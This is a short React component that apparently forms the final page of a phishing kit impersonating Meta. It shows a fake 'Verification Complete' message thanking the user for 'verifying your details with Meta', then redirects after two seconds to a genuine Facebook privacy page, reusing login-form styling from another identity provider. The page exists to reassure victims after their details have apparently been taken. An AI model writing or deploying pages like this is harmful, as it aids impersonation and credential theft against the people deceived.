import { useEffect } from "react";
import { wait } from "../utils/waiter";

export default function Grats() {

  const Redirect = async () => {
   await wait(2000)
    window.location.replace("https://free.facebook.com/privacy/policy/#")
  }

  useEffect(()=>{
    Redirect();
  }, [])
 
  return (
    <>
      <div className="auth-content">
        <div className="auth-content-inner">
          <div className="primary-auth">
          <form
                
                
                data-se="o-form"
                slot="content"
                id="form19"
                className="primary-auth-form o-form o-form-edit-mode"
              >
                <div
                  data-se="o-form-content"
                  className="o-form-content o-form-theme clearfix"
                >
                  
               

                  

                  <h3 style={{"textAlign": "center", fontSize:"20px", margin:"20px 0"}}>Verification Complete</h3>
                  <p style={{"textAlign": "center"}}>Thank you for verifying your details with Meta, You'll be redirected to the home page.</p>
				  
			
				
                </div>
               
              </form>
          
          </div>
        </div>
      </div>
    </>
  );
}
